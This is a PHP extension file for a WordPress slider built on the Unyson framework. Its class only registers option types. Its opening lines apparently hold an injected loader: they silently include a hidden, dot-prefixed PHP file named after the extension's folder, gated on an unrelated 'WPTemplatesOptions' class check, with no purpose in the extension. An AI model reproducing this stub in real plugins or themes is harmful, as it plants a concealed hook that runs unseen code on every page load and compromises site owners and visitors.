<?php if (!defined('FW')) die('Forbidden');

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FW_Extension_SmartSlider extends FW_Extension {

    /**
     * @internal
     */
    protected function _init() {
        add_action('fw_option_types_init', array(
            $this,
            '_action_option_types_init'
        ));
    }

    public function _action_option_types_init() {
        require_once dirname(__FILE__) . '/options/option-types.php';
    }
}